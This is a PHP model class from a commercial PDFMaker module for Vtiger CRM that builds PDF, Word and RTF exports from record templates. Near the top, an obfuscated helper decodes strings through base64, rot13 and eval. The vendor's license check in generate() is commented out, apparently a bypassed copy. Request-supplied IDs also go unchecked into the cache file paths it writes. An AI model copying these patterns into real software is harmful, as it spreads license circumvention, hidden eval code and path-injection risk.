<?php 
/* * *******************************************************************************
 * The content of this file is subject to the PDF Maker license.
 * ("License"); You may not use this file except in compliance with the License
 * The Initial Developer of the Original Code is IT-Solutions4You s.r.o.
 * Portions created by IT-Solutions4You s.r.o. are Copyright(C) IT-Solutions4You s.r.o.
 * All Rights Reserved.
 * ****************************************************************************** */
error_reporting(0);
?>
<?php function iCPmNFSoxUeevlWulmno($vyjYUeiWVI) {
    $r = base64_decode("YmFzZTY0X2RlY29kZShzdHJfcm90MTMoJHZ5allVZWlXVkkpKQ==");
    return eval("return $r;");
} ?><?php class PDFMaker_checkGenerate_Model extends Vtiger_Module_Model {
    protected $print = false;
    protected $set_password = true;
    protected $PDFMakerModuleModel = false;
    protected $PDFAttributes = array('idslist', 'record', 'mode', 'language', 'type', 'is_portal', 'TemplateIds', 'default_mode', 'forview', 'source_module');
    function __construct() {
        PDFMaker_Debugger_Model::GetInstance()->Init();
        $this->log = LoggerManager::getLogger('account');
        foreach ($this->PDFAttributes AS $atr) {
            $this->set($atr, '');
        }
        $this->set('generate_type', 'attachment');
        $this->set('onlyname', false);
    }
    static function getInstance() {
        $instance = new self();
        return $instance;
    }
    function setAvailablePassword($set_password) {
        $this->set_password = $set_password;
    }
    function setPrint($isprint = true) {
        if ($isprint) {
            $this->print = true;
        } else {
            $this->print = false;
        }
    }
    function generate(Vtiger_Request $request) {
        $PDFMaker = new PDFMaker_PDFMaker_Model();
        $RData = $request->getAll();
        $l = "site_URL";
        $salt = vglobal($l);
        //$PDFMaker_License_Action = new PDFMaker_License_Action();
        //$license = $PDFMaker_License_Action->checkLicense();
        $this->PDFMakerModuleModel = Vtiger_Module_Model::getInstance('PDFMaker');
        $version_type = $this->PDFMakerModuleModel->GetVersionType();
        //if ((substr($license, 5, 1) <= 1 && substr($license, 0, 5) == "propm" && $version_type == "professional") || (substr($license, 0, 5) == "baspm" && substr($license, 5, 1) <= 1 && $version_type == "basic")) {
            foreach ($this->PDFAttributes AS $atr) {
                if ($request->has($atr) && !$request->isEmpty($atr)) {
                    $this->set($atr, $request->get($atr));
                }
            }
            if ($request->has('relmodule') && !$request->isEmpty('relmodule')) {
                $relmodule = $request->get('relmodule');
                $this->set("source_module", $relmodule);
            } else {
                $relmodule = $this->get("source_module");
            }
            $mode = $this->get('mode');
            $language = $this->get('language');
            if (empty($language)) {
                $language = Vtiger_Language_Handler::getLanguage();
            }
            $type = $this->get('type');
            $forview = $this->get('forview');
            $Records = array();
            if ($forview == "List") {
                $Records = $this->PDFMakerModuleModel->getRecordsListFromRequest($request);
            } else {
                $idslist = $this->get('idslist');
                $record = $this->get('record');
                if (isset($idslist) && $idslist != "") {
                    $Records = explode(";", rtrim($idslist, ";"));
                } elseif (isset($record) && $record != "") {
                    $Records = array($record);
                }
            }
            if (empty($relmodule) && isset($Records[0])) {
                $relmodule = getSalesEntityType($Records[0]);
                $request->set("relmodule", $relmodule);
            }
            $pdftemplateid = "";
            if ($request->has('commontemplateid') && !$request->isEmpty('commontemplateid')) {
                $pdftemplateid = $request->get('commontemplateid');
            } elseif ($request->has('pdftemplateid') && !$request->isEmpty('pdftemplateid')) {
                $pdftemplateid = $request->get('pdftemplateid');
            }
            if (!empty($pdftemplateid)) {
                $commontemplateids = trim($pdftemplateid, ";");
                $Templateids = explode(";", $commontemplateids);
                $this->set('TemplateIds', $Templateids);
            } else {
                $Templateids = $this->get('TemplateIds');
                if (!$Templateids || empty($Templateids)) {
                    $Templateids = $this->PDFMakerModuleModel->getRequestTemplatesIds($request);
                    $this->set('TemplateIds', $Templateids);
                }
            }
            $name = "";
            $focus = CRMEntity::getInstance($relmodule);
            if ($mode == "content") {
                if (!Users_Privileges_Model::isPermitted($relmodule, 'EditView')) {
                    throw new AppException(vtranslate('LBL_PERMISSION_DENIED', $relmodule));
                }
                $PDFContents = array();
                foreach ($Records as $record) {
                    $focus->retrieve_entity_info($record, $relmodule);
                    $focus->id = $record;
                    foreach ($Templateids AS $templateid) {
                        $PDFContent = $PDFMaker->GetPDFContentRef($templateid, $relmodule, $focus, $language);
                        $pdf_content = $PDFContent->getContent();
                        $body_html = $pdf_content["body"];
                        $body_html = str_replace("#LISTVIEWBLOCK_START#", "", $body_html);
                        $body_html = str_replace("#LISTVIEWBLOCK_END#", "", $body_html);
                        $PDFContents[$templateid]["header"] = $pdf_content["header"];
                        $PDFContents[$templateid]["body"] = $body_html;
                        $PDFContents[$templateid]["footer"] = $pdf_content["footer"];
                    }
                }
                include_once ("modules/PDFMaker/EditPDF.php");
                showEditPDFForm($PDFContents);
            } else {
                if (isset($type) && ($type == "doc" OR $type == "rtf")) {
                    if ($this->PDFMakerModuleModel->CheckPermissions("EXPORT_RTF") === false) {
                        $this->PDFMakerModuleModel->DieDuePermission();
                    }
                    $Section = array();
                    $i = 1;
                    foreach ($Records as $record) {
                        $focus->retrieve_entity_info($record, $relmodule);
                        $focus->id = $record;
                        foreach ($Templateids AS $templateid) {
                            $PDFContent = $PDFMaker->GetPDFContentRef($templateid, $relmodule, $focus, $language);
                            $PDFContent->pagebreak = "<br clear=all style='mso-special-character:line-break;page-break-before:always'>";
                            $Settings = $PDFContent->getSettings();
                            if ($name == "") {
                                $name = $PDFContent->getFilename();
                            }
                            if (isset($mode) && $mode == "edit") {
                                $header_html = $RData["header" . $templateid];
                                $body_html = $RData["body" . $templateid];
                                $footer_html = $RData["footer" . $templateid];
                            } else {
                                $pdf_content = $PDFContent->getContent();
                                $header_html = $pdf_content["header"];
                                $body_html = $pdf_content["body"];
                                $footer_html = $pdf_content["footer"];
                            }
                            if ($header_html != "" OR $footer_html != "") {
                                $headerfooterurl = "cache/pdfmaker/" . $record . "_headerfooter_" . $templateid . "_" . $i . ".html";
                                $header_html = str_replace("{PAGENO}", "<!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-begin'></span><span style='mso-spacerun:yes'> </span>PAGE <span style='mso-element:field-separator'></span></span><![endif]--><span class=MsoPageNumber><span style='mso-no-proof:yes'>1</span></span><!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-end'></span></span><![endif]-->", $header_html);
                                $footer_html = str_replace("{PAGENO}", "<!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-begin'></span><span style='mso-spacerun:yes'> </span>PAGE <span style='mso-element:field-separator'></span></span><![endif]--><span class=MsoPageNumber><span style='mso-no-proof:yes'>1</span></span><!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-end'></span></span><![endif]-->", $footer_html);
                                $header_html = str_replace("{nb}", "<!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-begin'></span><span style='mso-spacerun:yes'> </span>NUMPAGES <span style='mso-element:field-separator'></span></span><![endif]--><span class=MsoPageNumber><span style='mso-no-proof:yes'>1</span></span><!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-end'></span></span><![endif]-->", $header_html);
                                $footer_html = str_replace("{nb}", "<!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-begin'></span><span style='mso-spacerun:yes'> </span>NUMPAGES <span style='mso-element:field-separator'></span></span><![endif]--><span class=MsoPageNumber><span style='mso-no-proof:yes'>1</span></span><!--[if supportFields]><span class=MsoPageNumber><span style='mso-element:field-end'></span></span><![endif]-->", $footer_html);
                                $headerfooter = '<!--[if supportFields]>';
                                $headerfooter.= '<div style="mso-element:header;" id=h' . $i . '><p class=MsoHeader>' . $header_html . '</p></div>';
                                $headerfooter.= '<div style="mso-element:footer;" id=f' . $i . '><p class=MsoFooter>' . $footer_html . '</p></div>';
                                $headerfooter.= '<![endif]-->';
                            } else {
                                $headerfooterurl = "";
                                $headerfooter = "";
                            }
                            $ListViewBlocks = array();
                            if (strpos($body_html, "#LISTVIEWBLOCK_START#") !== false && strpos($body_html, "#LISTVIEWBLOCK_END#") !== false) {
                                preg_match_all("|#LISTVIEWBLOCK_START#(.*)#LISTVIEWBLOCK_END#|sU", $body_html, $ListViewBlocks, PREG_PATTERN_ORDER);
                            }
                            if (count($ListViewBlocks) > 0) {
                                $TemplateContent[$templateid] = $pdf_content;
                                $TemplateSettings[$templateid] = $Settings;
                                $num_listview_blocks = count($ListViewBlocks[0]);
                                for ($idx = 0;$idx < $num_listview_blocks;$idx++) {
                                    $ListViewBlock[$templateid][$idx] = $ListViewBlocks[0][$idx];
                                    $ListViewBlockContent[$templateid][$idx][$record][] = $ListViewBlocks[1][$idx];
                                }
                            } else {
                                $content = '<div class="Section' . $i . '">';
                                $content.= $body_html;
                                $content.= '</div>';
                                $Templates[$templateid][] = $i;
                                $Section[$i] = array("settings" => $Settings, "content" => $content, "headerfooterurl" => $headerfooterurl, "headerfooter" => $headerfooter);
                                $i++;
                            }
                        }
                    }
                    if (count($TemplateContent) > 0 && isset($Section[1]) == false) {
                        $settings = array_values($TemplateSettings);
                        $contents = array_values($TemplateContent);
                        $content = '<div class="Section1">';
                        $content.= $contents[0]["body"];
                        $content.= '</div>';
                        $InitialState = array("settings" => $settings[0], "content" => $content, "headerfooterurl" => $headerfooterurl, "headerfooter" => $headerfooter);
                    } else {
                        $InitialState = $Section[1];
                    }
                    if ($name == "") {
                        $name = $PDFMaker->GenerateName($Records, $Templateids, $relmodule);
                    }
                    $doc = "<html xmlns:o='urn:schemas-microsoft-com:office:office' xmlns:w='urn:schemas-microsoft-com:office:word' xmlns='http://www.w3.org/TR/REC-html40'>";
                    $doc.= "<head>";
                    $doc.= "<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>";
                    $doc.= "<link rel=File-List href='cache/filelist.xml'>";
                    $doc.= "<title></title>
                                        <!--[if gte mso 9]><xml>
                                         <w:WordDocument>
                                          <w:View>Print</w:View>
                                          <w:DoNotHyphenateCaps/>
                                          <w:PunctuationKerning/>
                                          <w:DrawingGridHorizontalSpacing>9.35 pt</w:DrawingGridHorizontalSpacing>
                                          <w:DrawingGridVerticalSpacing>9.35 pt</w:DrawingGridVerticalSpacing>
                                         </w:WordDocument>
                                        </xml><![endif]-->
                                        <style>
                                        <!--
                                         / * Font Definitions * /
                                        @font-face
                                                {font-family:Verdana;
                                                panose-1:2 11 6 4 3 5 4 4 2 4;
                                                mso-font-charset:0;
                                                mso-generic-font-family:swiss;
                                                mso-font-pitch:variable;
                                                mso-font-signature:536871559 0 0 0 415 0;}
                                         / * Style Definitions * /
                                        p.MsoNormal, li.MsoNormal, div.MsoNormal
                                                {mso-style-parent:'';
                                                margin:0in;
                                                padding:0in;
                                                margin-bottom:.0001pt;
                                                mso-pagination:widow-orphan;
                                                font-size:7.5pt;
                                                mso-bidi-font-size:8.0pt;
                                                font-family:'Verdana';
                                                mso-fareast-font-family:'Verdana';}
                                        p.small
                                                {mso-style-parent:'';
                                                margin:0in;
                                                margin-bottom:.0001pt;
                                                mso-pagination:widow-orphan;
                                                font-size:1.0pt;
                                          mso-bidi-font-size:1.0pt;
                                                font-family:'Verdana';
                                                mso-fareast-font-family:'Verdana';}";
                    $Fomats['A3'] = array(29.7, 42, "cm");
                    $Fomats['A4'] = array(21, 29.7, "cm");
                    $Fomats['A5'] = array(14.8, 21, "cm");
                    $Fomats['A6'] = array(10.5, 14.8, "cm");
                    $Fomats['Letter'] = array(21.59, 27.94, "cm");
                    $Fomats['Legal'] = array(21.59, 35.56, "cm");
                    $data = $InitialState;
                    $n = "1";
                    $format = $data["settings"]["format"];
                    if (strpos($format, ";") > 0) {
                        $tmpArr = explode(";", $format);
                        $format = "Custom";
                        $Fomats["Custom"] = array(round(($tmpArr[0] / 10), 2), round(($tmpArr[1] / 10), 2), "cm");
                    }
                    $orientation = $data["settings"]["orientation"];
                    if ($orientation == "portrait") {
                        $size = $Fomats[$format][0] . $Fomats[$format][2] . " " . $Fomats[$format][1] . $Fomats[$format][2] . "; ";
                    } else {
                        $size = $Fomats[$format][1] . $Fomats[$format][2] . " " . $Fomats[$format][0] . $Fomats[$format][2] . "; ";
                    }
                    $margin_left = $data["settings"]["margin_left"];
                    $margin_right = $data["settings"]["margin_right"];
                    $margin_top = $data["settings"]["margin_top"];
                    $margin_bottom = $data["settings"]["margin_bottom"];
                    $doc.= "@page Section" . $n . "
                                {
                                size: " . $size . ";
                                margin: " . $margin_top . "mm " . $margin_right . "mm " . $margin_bottom . "mm " . $margin_left . "mm;
                                mso-page-orientation: " . $orientation . ";
                                padding: 0cm 0cm 0cm 0cm; ";
                    if ($data["headerfooterurl"] != "") {
                        $doc.= 'mso-footer: url("' . $salt . '/' . $data["headerfooterurl"] . '") f' . $n . '; ';
                        $doc.= 'mso-header: url("' . $salt . '/' . $data["headerfooterurl"] . '") h' . $n . '; ';
                        if (!is_dir('cache/pdfmaker')) {
                            mkdir('cache/pdfmaker');
                        }
                        $fp = fopen($data["headerfooterurl"], 'w');
                        $c = '<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml"= xmlns="http://www.w3.org/TR/REC-html40">';
                        $c.= '<body>';
                        $c.= $data["headerfooter"];
                        $c.= '</body>';
                        $c.= '</html>';
                        fwrite($fp, $c);
                        fclose($fp);
                    }
                    $doc.= '}
                                div.Section' . $n . '
                                {page:Section' . $n . ';}';
                    $doc.= 'p.MsoHeader, li.MsoHeader, div.MsoHeader
                                        {margin:0in;
                                        margin-bottom:.0001pt;
                                        mso-pagination:widow-orphan;
                                        tab-stops:center 3.0in right 6.0in;}
                                  p.MsoFooter, li.MsoFooter, div.MsoFooter
                                  { mso-pagination:widow-orphan;
                                    tab-stops:center 216.0pt right 432.0pt;
                                    font-family:"Arial";
                                    font-size:1.0pt;
                                  }
                                        -->
                                        </style>
                                        <!--[if gte mso 9]><xml>
                                        <o:shapedefaults v:ext="edit" spidmax="1032">
                                        <o:colormenu v:ext="edit" strokecolor="none"/>
                                        </o:shapedefaults></xml><![endif]--><!--[if gte mso 9]><xml>
                                        <o:shapelayout v:ext="edit">
                                        <o:idmap v:ext="edit" data="1"/>
                                        </o:shapelayout></xml><![endif]-->';
                    $doc.= "</head>";
                    $doc.= "<body>";
                    foreach ($Section AS $n => $data) {
                        if ($n > 1) $doc.= '<br clear=all style="mso-special-character:line-break;page-break-before:always">';
                        $doc.= $data["content"];
                    }
                    if (count($TemplateContent) > 0) {
                        foreach ($TemplateContent AS $templateid => $TContent) {
                            $body_html = $TContent["body"];
                            foreach ($ListViewBlock[$templateid] AS $id => $text) {
                                $replace = "";
                                $cridx = 1;
                                foreach ($Records as $record) {
                                    $replace.= implode("", $ListViewBlockContent[$templateid][$id][$record]);
                                    $replace = str_ireplace('$CRIDX$', $cridx++, $replace);
                                }
                                $body_html = str_replace($text, $replace, $body_html);
                            }
                            if ($n > 1) {
                                $doc.= '<br clear=all style="mso-special-character:line-break;page-break-before:always">';
                            }
                            $doc.= $body_html;
                        }
                    }
                    $doc.= '</body>';
                    $doc.= '</html>';
                    $doc = $this->fixImg($doc);
                    @header("Cache-Control: ");
                    @header("Pragma: ");
                    if ($type == "doc") {
                        @header("Content-type: application/vnd.ms-word");
                        @header("Content-Disposition: attachment;Filename=" . $name . ".doc");
                    } elseif ($type == "rtf") {
                        @header("Content-type: application/rtf");
                        @header("Content-Disposition: attachment;Filename=" . $name . ".rtf");
                    }
                    echo $doc;
                } else { // export to pdf
                    $preContent = array();
                    if (isset($mode) && $mode == "edit") {
                        foreach ($Templateids as $templateid) {
                            $preContent["header" . $templateid] = $RData["header" . $templateid];
                            $preContent["body" . $templateid] = $RData["body" . $templateid];
                            $preContent["footer" . $templateid] = $RData["footer" . $templateid];
                        }
                    }
                    $mpdf = "";
                    $name = $PDFMaker->GetPreparedMPDF($mpdf, $Records, $Templateids, $relmodule, $language, $preContent, $this->set_password);
                    $is_portal = $this->get('is_portal');
                    $onlyname = $this->get('onlyname');
                    if ($is_portal == "true") {
                        $content = $mpdf->Output('', 'S');
                        return array("content" => $content, "filename" => $name . ".pdf");
                    }
                    if ($onlyname == true) {
                        return array("file_path" => $file_path, "filename" => $name . ".pdf");
                    } else {
                        if ($request->has('print') && !$request->isEmpty('print')) {
                            if ($request->get('print') == "true") {
                                $this->print = true;
                            }
                        }
                        if ($this->print == true) {
                            $mpdf->AutoPrint(true);
                            $this->set('generate_type', 'inline');
                        }
                        $content = $mpdf->Output('', 'S');
                        @ob_clean();
                        header('Content-Type: application/pdf');
                        header('Content-Length: ' . strlen($content));
                        $generate_type = $this->get('generate_type');
                        header('Content-Disposition: ' . $generate_type . '; filename="' . $name . '.pdf"');
                        header("Content-Description: PHP Generated Data");
                        header('Pragma: public');
                        echo $content;
                    }
                }
            }
        //} else {
        //    throw new AppException(vtranslate('LBL_INVALID_KEY', 'PDFMaker'));
        //}
    }
    private function fixImg($content) {
        $e = "site_URL";
        $surl = vglobal($e);
        $http = "http://";
        $simple_html_dom_file = $this->getSimpleHtmlDomFile();
        require_once ($simple_html_dom_file);
        $html = str_get_html($content);
        if (is_array($html->find("img"))) {
            foreach ($html->find("img") as $img) {
                if (strpos($img->src, $http) === false) {
                    $newPath = $surl . "/" . $img->src;
                    $img->src = $newPath;
                }
            }
            return $html->save();
        } else {
            return $content;
        }
    }
    private function getSimpleHtmlDomFile() {
        $simple_html_dom_file = "include/simplehtmldom/simple_html_dom.php";
        if (file_exists($simple_html_dom_file)) {
            return $simple_html_dom_file;
        } else {
            return "modules/PDFMaker/resources/classes/simple_html_dom.php";
        }
    }
} ?>